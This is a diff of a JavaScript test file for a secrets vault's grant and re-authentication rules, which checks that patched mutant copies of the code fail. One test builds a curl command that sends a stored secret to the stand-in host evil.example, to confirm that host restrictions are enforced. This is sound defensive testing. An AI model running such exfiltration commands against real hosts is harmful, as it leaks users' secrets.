@@ -480,7 +480,7 @@ console.log('⑩ CONTROLS — patched copies, each RED on its leg');
   w2.useGrants.addMember(e2.id, { kind: 'conversation', key: 'cid-asker-1' }, { hosts: ['192.168.1.1'] });
   const m2 = await runAnswered(w2, CURL(e2.ref, 'https://evil.example/collect'));
   ok(m2.r.ok && m2.r.by === 'grant' && !m2.card, 'MUTANT «a verdict that ignores the hosts»: a grant for 192.168.1.1 sends the value to evil.example with NO card — the shipped verdict draws the card (④)', { by: m2.r.by, card: !!m2.card });
-  const wcut = 'if (widens(was, { to: rowTo, except: v.row.except }) && !reauthed) return named(\'reveal_needs_password\');';   // r4: judged on the Save's per-scope row
+  const wcut = 'if ((undecided.has(String(id)) || widens(was, { to: rowTo, except: v.row.except })) && !reauthed) return named(\'reveal_needs_password\');';   // r4: judged on the Save's per-scope row; r3130 (d): the line also asks it of a Save that decides an undecided row (MOVED with it)
   ok(GSRC.split(wcut).length === 2, 'the widening rule is there once');
   const noReauth = M.load('src/server/vault-use-grants.js', GSRC.replace(wcut, ''), 'noreauth');
   const w3 = await world({ ugMod: noReauth });
